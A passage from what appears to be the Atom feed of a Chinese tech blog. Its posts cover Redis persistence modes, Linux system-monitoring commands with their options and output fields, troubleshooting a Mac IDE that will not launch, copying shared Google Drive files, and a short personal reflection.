并没有绝对正确的答案。需要根据实际情况去作取舍，不过通常都是使用混合持久化的方式。</p><table><thead><tr><th>命令</th><th>RDB</th><th>AOF</th></tr></thead><tbody><tr><td>启动优先级</td><td>低</td><td>高</td></tr><tr><td>体积</td><td>小</td><td>大</td></tr><tr><td>恢复速度</td><td>快</td><td>慢</td></tr><tr><td>数据安全性</td><td>丢数据</td><td>根据策略决定</td></tr><tr><td>级别</td><td>重</td><td>轻</td></tr></tbody></table><h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>混合持久化是通过 <code>aof-use-rdb-preamble</code> 参数来开启的。它的操作方式是这样的，在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。这样既能保证数据恢复时的速度，同时又能减少数据丢失的风险。</p><p>那么混合持久化中是如何来进行数据恢复的呢？在 Redis 重启时，先加载 RDB 的内容，然后再重放增量 AOF 格式命令。这样就避免了 AOF 持久化时的全量加载，从而使加载速率得到大幅提升。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>RDB持久化</p><ul><li>将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复。</li><li>有手动触发和自动触发两种机制。</li></ul><p>AOF持久化</p><ul><li>以文件追加的方式写入客户端执行的写命令。</li><li>数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。</li></ul><p>混合持久化</p><ul><li>在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/ZBDOsSGnBAr0rM37Dih_ng" target="_blank" rel="noopener">老半天，终于把 redis 持久化搞懂了</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;什么是持久化？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。&lt;/p&gt;</summary>
    
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="https://www.0x2beace.com/tags/Redis/"/>
    
    <category term="持久化" scheme="https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统监控命令整理汇总</title>
    <link href="https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/"/>
    <id>https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/</id>
    <published>2020-11-17T14:55:16.000Z</published>
    <updated>2020-11-19T15:03:30.404Z</updated>
    
    <content type="html"><![CDATA[<p>以下命令以Ubuntu 18.04 LTS 系统为准。</p><a id="more"></a><table><thead><tr><th>命令</th><th>功能</th><th>实例</th></tr></thead><tbody><tr><td>free</td><td>查看内存使用情况，包括物理内存和虚拟内存</td><td>free -h 或 free -m</td></tr><tr><td>vmstat</td><td>对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息</td><td>vmstat 2 100</td></tr><tr><td>top</td><td>实时显示系统中各个进程的资源占用状况及总体状况</td><td>top</td></tr><tr><td>mpstat</td><td>实时系统监控工具，它会报告与CPU相关的统计信息</td><td>mpstat</td></tr><tr><td>sar</td><td>收集、报告和保存CPU、内存、输入输出端口使用情况</td><td>sar -n DEV 3 100</td></tr><tr><td>netstat</td><td>检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据</td><td>netstat -a</td></tr><tr><td>tcpdump</td><td>用于捕捉或者过滤网络上指定接口上接收或者传输的TCP/IP包</td><td>tcpdump -i eth0 -c 3</td></tr><tr><td>iptraf</td><td>用来生成包括TCP信息、UDP计数、ICMP和OSPF信息、以太网负载信息、节点状态信息、IP校验和错误等等统计数据</td><td>iptraf</td></tr><tr><td>iostat</td><td>收集显示系统存储设备输入和输出状态统计</td><td>iostat -x -k 2 100</td></tr><tr><td>lsof</td><td>查看进程打开的文件的工具，查看监听端口</td><td>lsof -i :3000</td></tr><tr><td>atop</td><td>显示的是各种系统资源（CPU, memory, network, I/O, kernel）的综合，并且在高负载的情况下进行了彩色标注</td><td>atop</td></tr><tr><td>htop</td><td>它和top命令十分相似，高级的交互式的实时linux进程监控工具</td><td>htop</td></tr><tr><td>ps</td><td>最基本同时也是非常强大的进程查看命令</td><td>ps aux</td></tr><tr><td>glances</td><td>监视 CPU，平均负载，内存，网络流量，磁盘 I/O，其他处理器 和 文件系统 空间的利用情况</td><td>glances</td></tr><tr><td>dstat</td><td>全能系统信息统计工具，可用于替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具</td><td>dstat</td></tr><tr><td>uptime</td><td>用于查看服务器运行了多长时间以及有多少个用户登录，快速获知服务器的负荷情况</td><td>uptime</td></tr><tr><td>dmesg</td><td>主要用来显示内核信息。使用dmesg可以有效诊断机器硬件故障或者添加硬件出现的问题</td><td>dmesg</td></tr><tr><td>mpstat</td><td>用于报告多路CPU主机的每颗CPU活动情况，以及整个主机的CPU情况</td><td>mpstat 2 3</td></tr><tr><td>nmon</td><td>监控CPU、内存、I/O、文件系统及网络资源。对于内存的使用，它可以实时的显示 总/剩余内存、交换空间等信息</td><td>nmon</td></tr><tr><td>mytop</td><td>用于监控 mysql 的线程和性能。它能让你实时查看数据库以及正在处理哪些查询</td><td>mytop</td></tr><tr><td>iftop</td><td>用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等</td><td>iftop</td></tr><tr><td>jnettop</td><td>以相同的方式来监测网络流量但比 iftop 更形象。它还支持自定义的文本输出，并能以友好的交互方式来深度分析日志</td><td>jnettop</td></tr><tr><td>ngrep</td><td>网络层的 grep。它使用 pcap ，允许通过指定扩展正则表达式或十六进制表达式来匹配数据包</td><td>ngrep</td></tr><tr><td>nmap</td><td>可以扫描你服务器开放的端口并且可以检测正在使用哪个操作系统</td><td>nmap localhost</td></tr><tr><td>du</td><td>查看Linux系统中某目录的大小</td><td>du -sh *</td></tr><tr><td>fdisk</td><td>查看硬盘及分区信息</td><td>fdisk -l</td></tr></tbody></table><h2 id="内存监控"><a href="#内存监控" class="headerlink" title="内存监控"></a>内存监控</h2><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free</code>命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free (选项)</span><br></pre></td></tr></table></figure><p>常用选项：<br><code>-b</code>：以Byte为单位显示内存使用情况；<br><code>-k</code>：以KB为单位显示内存使用情况；<br><code>-m</code>：以MB为单位显示内存使用情况；<br><code>-g</code>：以GB为单位显示内存使用情况;<br><code>-o</code>：不显示缓冲区调节列；<br><code>-t</code>：显示内存总和列；<br><code>-V</code>：显示版本信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201117222535.png" alt=""></p><p>字段说明：</p><ul><li>total：内存总数；</li><li>used：已经使用的内存数，包括 cached 和应用程序实际使用的内存；</li><li>free：空闲的内存数；</li><li>shared：当前已经废弃不用；</li><li>buffers：缓存内存数；</li><li>cached：缓存内存数。</li></ul><p>关系：total = used + free</p><h3 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h3><p>vmstat命令 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmstat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项<br><code>-a</code>：显示活动内页；<br><code>-f</code>：显示启动后创建的进程总数；<br><code>-m</code>：显示slab信息；<br><code>-n</code>：头信息仅显示一次；<br><code>-s</code>：以表格方式显示事件计数器和内存状态；<br><code>-d</code>：报告磁盘状态；<br><code>-p</code>：显示指定的硬盘分区状态；<br><code>-S</code>：输出信息的单位。</p><p>参数</p><ul><li>事件间隔：状态信息刷新的时间间隔；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201117223922.png" alt=""></p><p>字段说明：<br>Procs（进程）</p><ul><li>r: 运行和等待CPU时间片的进程数，这个值如果长期大于系统CPU个数，就说明CPU资源不足，可以考虑增加CPU </li><li>b: 等待资源的进程数，比如正在等待I/O或者内存交换等</li></ul><p>Memory（内存）</p><ul><li>swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。</li><li>free: 空闲物理内存大小（以KB为单位）。</li><li>buff: 用作缓冲的内存大小。</li><li>cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多。如果此时IO中的bi比较小，就说明文件系统效率比较好。</li></ul><p>Swap</p><ul><li>si: 每秒从交换区写到内存的大小，由磁盘调入内存。</li><li>so: 每秒写入交换区的内存大小，由内存调入磁盘。</li></ul><p>注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。</p><p>IO（现在的Linux版本块的大小为1kb）</p><ul><li>bi: 每秒读取的块数</li><li>bo: 每秒写入的块数</li></ul><p>注意：随机磁盘读写的时候，这2个值较大（如超出1024k)，而且wa值比较大，则表示系统磁盘IO性能瓶颈。</p><p>system（系统）</p><ul><li>in: 每秒中断数，包括时钟中断。</li><li>cs: 每秒上下文切换数。</li></ul><p>注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。</p><p>CPU（以百分比表示）<br>us: 用户进程执行时间百分比(user time)<br>us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。</p><ul><li>sy: 内核系统进程执行时间百分比(system time)<br>sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。</li><li>id: 空闲时间百分比</li><li>wa: IO等待时间百分比<br>wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。</li><li>st：一般不关注，虚拟机占用的时间百分比。</li></ul><h2 id="CPU-监控"><a href="#CPU-监控" class="headerlink" title="CPU 监控"></a>CPU 监控</h2><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>top命令 可以实时动态地查看系统的整体运行情况。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top (选项)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-b</code>：以批处理模式操作；<br><code>-c</code>：显示完整的治命令；<br><code>-d</code>：屏幕刷新间隔时间；<br><code>-I</code>：忽略失效过程；<br><code>-s</code>：保密模式；<br><code>-S</code>：累积模式；<br><code>-i&lt;时间&gt;</code>：设置间隔时间；<br><code>-u&lt;用户名&gt;</code>：指定用户名；<br><code>-p&lt;进程号&gt;</code>：指定进程；<br><code>-n&lt;次数&gt;</code>：循环显示的次数。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118231037.png" alt=""></p><p>字段说明：</p><ul><li><code>top</code>：系统当前时间</li><li><code>up xxx days</code>：系统运行时间</li><li><code>1 users</code>：当前登录用户个数</li><li><code>load average</code>：系统负载。即任务队列的平均长度。三个数值分别为最近1分钟、最近5分钟、最近15分钟的平均负载。——超过N（CPU核数）说明系统满负荷运行。</li><li>Tasks<ul><li><code>total</code>：总进程数</li><li><code>running</code>：正在运行的进程数</li><li><code>sleeping</code>：睡眠的进程数</li><li><code>stopped</code>：停止的进程数</li><li><code>zombie</code>：冻结的进程数</li></ul></li><li>%Cpu(s)<ul><li><code>us</code>：用户进程消耗的CPU百分比</li><li><code>sy</code>：内核进程消耗的CPU百分比</li><li><code>ni</code>：改变过优先级的进程占用CPU的百分比</li><li><code>id</code>：空闲CPU的百分比</li><li><code>wa</code>：IO等待消耗的CPU百分比</li></ul></li><li>Mem<ul><li><code>total</code>：物理内存总量</li><li><code>free</code>：空闲物理内存总量</li><li><code>used</code>：已用物理内存总量</li><li><code>buff</code>：用作内核缓存内存总量</li></ul></li><li>Swap<ul><li><code>total</code>：虚拟内存总量</li><li><code>free</code>：空闲虚拟内存总量</li><li><code>used</code>：已用虚拟内存总量</li></ul></li></ul><h3 id="mpstat"><a href="#mpstat" class="headerlink" title="mpstat"></a>mpstat</h3><p>mpstat命令 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mpstat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-P：指定CPU编号。</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>间隔时间：每次报告的间隔时间（秒）；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118232333.png" alt=""></p><p>ALL表示显示所有CPUs，也可以指定某个CPU；2表示刷新间隔。</p><h2 id="网络监控"><a href="#网络监控" class="headerlink" title="网络监控"></a>网络监控</h2><h3 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h3><p>sar命令 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118232850.png" alt=""></p><p>字段说明：</p><ul><li><code>IFACE</code>：网络设备的名称</li><li><code>rxpck/s</code>：每秒钟接收到的包数目</li><li><code>txpck/s</code>：每秒钟发送出去的包数目</li><li><code>rxkB/s</code>：每秒钟接收到的字节数</li><li><code>txkB/s</code>：每秒钟发送出去的字节数</li></ul><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>netstat命令一般用于检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据。</p><p>常用实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -aup      # 输出所有UDP连接状况</span><br><span class="line">netstat -atp      # 输出所有TCP连接状况</span><br><span class="line">netstat -s        # 显示各个协议的网络统计信息</span><br><span class="line">netstat -i        # 显示网卡列表</span><br><span class="line">netstat -r        # 显示路由表信息</span><br><span class="line">netstat -l        # 只显示监听端口</span><br><span class="line">netstat -lt       # 只列出所有监听 tcp 端口</span><br><span class="line">netstat -lu       # 只列出所有监听 udp 端口</span><br><span class="line">netstat -lx       # 只列出所有监听 UNIX 端口</span><br></pre></td></tr></table></figure><h2 id="磁盘监控"><a href="#磁盘监控" class="headerlink" title="磁盘监控"></a>磁盘监控</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><p>df命令 用于显示磁盘分区上的可使用的磁盘空间。如果没有文件名被指定，则显示当前所有被挂载的文件系统，默认以 KB 为单位。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-a</code>  全部文件系统列表<br><code>-h</code>  以方便阅读的方式显示<br><code>-i</code>  显示inode信息<br><code>-T</code>  显示文件系统类型<br><code>-l</code>  只显示本地文件系统<br><code>-k</code>  以KB为单位<br><code>-m</code>  以MB为单位</p><p>参数：</p><ul><li>文件：指定文件系统上的文件。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118234529.png" alt=""></p><h3 id="iostat"><a href="#iostat" class="headerlink" title="iostat"></a>iostat</h3><p>iostat命令 被用于监视系统输入输出设备和CPU的使用情况。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iostat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-c</code>：仅显示CPU使用情况；<br><code>-d</code>：仅显示设备利用率；<br><code>-k</code>：显示状态以千字节每秒为单位，而不使用块每秒；<br><code>-m</code>：显示状态以兆字节每秒为单位；<br><code>-p</code>：仅显示块设备和所有被使用的其他分区的状态；<br><code>-t</code>：显示每个报告产生时的时间；<br><code>-V</code>：显示版号并退出；<br><code>-x</code>：显示扩展状态。</p><p>参数：</p><ul><li>间隔时间：每次报告的间隔时间（秒）；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201119221611.png" alt=""></p><p>字段说明：</p><ul><li><code>r/s</code>: 每秒完成的读 I/O 设备次数。</li><li><code>w/s</code>: 每秒完成的写 I/O 设备次数。</li><li><code>rkB/s</code>: 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节。</li><li><code>wkB/s</code>: 每秒写K字节数.是 wsect/s 的一半。</li><li><code>avgrq-sz</code>: 平均每次设备I/O操作的数据大小 (扇区)。</li><li><code>avgqu-sz</code>: 平均I/O队列长度。</li><li><code>await</code>: 平均每次设备I/O操作的等待时间 (毫秒)。</li><li><code>svctm</code>: 平均每次设备I/O操作的服务时间 (毫秒)。</li><li><code>%util</code>: 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的。</li></ul><h3 id="iotop"><a href="#iotop" class="headerlink" title="iotop"></a>iotop</h3><p>iotop命令 是一个用来监视磁盘I/O使用状况的top类工具。</p><p>iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iotop (选项)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-o</code>：只显示有io操作的进程<br><code>-b</code>：批量显示，无交互，主要用作记录到文件。<br><code>-n</code>： NUM：显示NUM次，主要用于非交互式模式。<br><code>-d SEC</code>：间隔SEC秒显示一次。<br><code>-p PID</code>：监控的进程pid。<br><code>-u USER</code>：监控的进程用户。</p><p>iotop常用快捷键：</p><ul><li>左右箭头：改变排序方式，默认是按IO排序。</li><li>r：改变排序顺序。</li><li>o：只显示有IO输出的进程。</li><li>p：进程/线程的显示方式的切换。</li><li>a：显示累积使用量。</li><li>q：退出。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201119221830.png" alt=""></p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>ps（Process Status，进程状态）命令 用于报告当前系统的进程状态。</p><p>ps 的用法非常多，这里仅列举一些常用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep &lt;name&gt;      # 查看name 进程详细信息</span><br><span class="line">ps -p &lt;pid&gt; -L             # 显示进程&lt;pid&gt; 的所有线程</span><br><span class="line">ps -o lstart &lt;pid&gt;         # 显示进程的启动时间</span><br><span class="line">ps -f --forest -C &lt;name&gt;   # 用树的风格显示进程的层次关系</span><br><span class="line">ps -e -o pid,uname,pcpu,pmem,comm,etime  # 定制显示的列</span><br><span class="line">ps -o lstart &lt;pid&gt;         # 显示进程的启动时间</span><br></pre></td></tr></table></figure><h2 id="系统监控全能工具"><a href="#系统监控全能工具" class="headerlink" title="系统监控全能工具"></a>系统监控全能工具</h2><h3 id="glances"><a href="#glances" class="headerlink" title="glances"></a>glances</h3><p>glances 是一个用来监视 GNU/Linux 和 FreeBSD 操作系统的 GPL 授权的全能工具。</p><p>Glances 会用一下几种颜色来代表状态：</p><ul><li>绿色：OK（一切正常） </li><li>蓝色：CAREFUL（需要注意） </li><li>紫色：WARNING（警告） </li><li>红色：CRITICAL（严重）。</li></ul><p>阀值可以在配置文件中设置，一般阀值被默认设置为（careful=50、warning=70、critical=90）。</p><h3 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h3><p>dstat命令 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具。</p><p>直接使用dstat，默认使用的是-cdngy参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://wzfou.com/linux-jiankong/" target="_blank" rel="noopener">Linux系统监控命令整理汇总-掌握CPU,内存,磁盘IO等找出性能瓶颈</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;以下命令以Ubuntu 18.04 LTS 系统为准。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Ubuntu" scheme="https://www.0x2beace.com/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Mac 下IDEA 无法正常启动</title>
    <link href="https://www.0x2beace.com/idea-cannot-start-normally-under-mac/"/>
    <id>https://www.0x2beace.com/idea-cannot-start-normally-under-mac/</id>
    <published>2020-11-15T15:37:34.000Z</published>
    <updated>2020-11-18T08:42:47.601Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天本来打算使用<code>PHPStorm</code>的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。</p><a id="more"></a><p>因为使用的<code>PHPStorm</code>是破解的，所以我以为是失效了。<br>就在我一筹莫展准备重装一遍的，突然想起”要不试试通过命令行启动“？</p><p>于是我找到<code>PHPStrom</code>的包文件之后，尝试通过命令行启动，虽然同样失败了，但是命令行输出了一些信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/4DDACB7F-B42E-4142-8C20-F7DF8E450D53.png" alt=""></p><p>正是这些信息，才让我想起来，今天上午在整理文件时，不小心把<code>PHPStorm</code>中依赖的一个文件给删除掉了。</p><p>于是，马上找到了那个文件并还原了，之后果然能正常启动了。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果你也遇到了类似的情况，那么可以尝试这种方式，或许能帮助你找到问题所在。</p><ol><li>找到应用程序</li><li>右键显示包文件</li><li>依次进入<code>Contents-&gt;MacOS</code></li><li>双击<code>shell</code>脚本</li></ol><p>接着无论成功或失败都能输出一些内容，然后利用这些内容去查找问题所在。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;今天本来打算使用&lt;code&gt;PHPStorm&lt;/code&gt;的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。&lt;/p&gt;</summary>
    
    
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Mac/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Google Drive 如何转存文件？</title>
    <link href="https://www.0x2beace.com/how-does-google-drive-transfer-files/"/>
    <id>https://www.0x2beace.com/how-does-google-drive-transfer-files/</id>
    <published>2020-11-13T13:55:50.000Z</published>
    <updated>2020-11-13T13:57:07.503Z</updated>
    
    <content type="html"><![CDATA[<p>对于初次使用<a href="https://www.google.com/drive/" target="_blank" rel="noopener">Google Drive</a>（以下简称 GD）的同学来说，可能会有以下几点困惑。</p><a id="more"></a><ol><li>大家常说的转存是什么意思？</li><li>常见的转存方式有哪几种？</li></ol><p>在正式回答上面两个问题之前，先来了解一下GD。</p><p>GD 是Google 在2012 年4 月24 日推出的一个在线同步存储服务，类似百度的百度网盘，不过不同之处在于GD 不会限速。普通用户默认的存储空间是15 GB。</p><p>用户可以将其他用户分享的文件添加到“我的云端硬盘”，这种方式并不会占用用户的存储空间，这个操作相当于是在“我的云端硬盘”中创建了一个<strong>软链接</strong>，可以快速访问该文件，而文件所有者则还是<strong>分享者</strong>，如果原作者删除了，那么你网盘里的也会消失。</p><p>所以为了解决上述问题，转存的概念便诞生了，它存在的意义是将其他用户分享的文件保存至自己的云盘，类似百度网盘的“保存到我的网盘”功能。</p><p>但有所不同的是，如果<strong>分享者</strong>没有开放权限，那么其他用户则无权转存。</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>在需要转存的文件上，点击右键，制作一个拷贝，拷贝的文件位于“我的云端硬盘”中。</p><p>第一种方式最简单，适用于小文件，不能对文件夹进行 Copy 操作。</p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p><a href="https://softgateon.herokuapp.com/urltodrive/" target="_blank" rel="noopener">Copy, URL to Google Drive</a> 是一个云端硬盘插件。</p><p>在目标文件上点击右键，选择打开方式，关联更多应用。</p><p>搜索Copy, URL to Google Drive 进行安装。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201113214943.png" alt=""></p><p>安装完成之后，还需要进行Google 账号授权才能进行转存操作。</p><p>在需要转存的文件夹上 右键-打开方式-Copy, URL to Google Drive，之后点击 Save, Copy to Google Drive，就可以看见正在转存了，如果文件较大时间会比较久。</p><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><p>在Telegram 上有人开发了一个机器人（@GoogleDriveManagerBot），专门用于GD 文件转存。</p><p>该机器人可以实现谷歌网盘资源转存以及网盘内资源批量重命名，普通用户仅可绑定一个 GD 账号。<br>通过简单的命令即可对文件进行转存。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>方式一最简单，门槛最低，即使在没有权限的情况下，也能进行Copy 操作，但是效率很低。</p><p>方式二、三省事，效率高，但前提是得有权限。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.jianshu.com/p/42f323bd15ef" target="_blank" rel="noopener">一个方便转存 Google Drive 分享文件的方法</a></li><li><a href="https://blog.curlc.com/archives/569.html" target="_blank" rel="noopener">转存Google Drive资源到自己的Google Drive</a></li><li><a href="https://blog.frytea.com/archives/31/" target="_blank" rel="noopener">Linux 下使用 rclone 挂载网盘到本地</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;对于初次使用&lt;a href=&quot;https://www.google.com/drive/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Google Drive&lt;/a&gt;（以下简称 GD）的同学来说，可能会有以下几点困惑。&lt;/p&gt;</summary>
    
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Skill/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Google Drive" scheme="https://www.0x2beace.com/tags/Google-Drive/"/>
    
  </entry>
  
  <entry>
    <title>互联网人的双十一</title>
    <link href="https://www.0x2beace.com/double-eleven-for-internet-people/"/>
    <id>https://www.0x2beace.com/double-eleven-for-internet-people/</id>
    <published>2020-11-12T00:33:10.000Z</published>
    <updated>2020-11-12T00:34:35.354Z</updated>
    
    <content type="html"><![CDATA[<p>我其实不太会去写这类文章，那为什么要写这篇文章呢？<br>想抓住双十一的尾巴，记录一些想法。</p><a id="more"></a><p>今年的双十一我本来也是啥都没买，</p><p>可就在晚上七点左右，线上的某个平台，出了一点问题，订单的盈亏跟用户的余额对不上。<br>经过一番排查发现是因为处理订单的那个脚本不知为何特别慢，导致大量订单全部堆积在一起了。</p><p>因为一些历史包袱的原因，在处理方式上我是知道这个脚本存在一些隐患的。<br>同事提议不如这个脚本让他去用Node.js 写吧，尽管很不情愿，但也没办法。</p><p>想在仔细回想，当时那种感觉还是很清晰，我真的不喜欢那种能被替代的感觉，那一瞬间觉得所有的娱乐活动都没有意思了，只有把技术才是唯一的热爱。</p><p>晚上回家之后，第一件事应该是练吉他，但昨天似乎也没啥心思练了。</p><p>今年本来就没少为知识付费，视频课程，电子书籍，纸质书籍各种学习资料。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201112083115.png" alt=""></p><p>然后昨天晚上又在慕课网上买了三门实战课程，真的不想做一个Cruder，这是我最后的倔强了。</p><p>在如今这个互联网高速发展的时代，我想学习以及需要学习的东西真的是太多了，真的是学的越多，才发现自己懂的真的好少。</p><p>最后想说的是，希望自己能保持住这份初心，继续加油。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我其实不太会去写这类文章，那为什么要写这篇文章呢？&lt;br&gt;想抓住双十一的尾巴，记录一些想法。&lt;/p&gt;</summary>
    
    
    
    <category term="碎碎念" scheme="https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
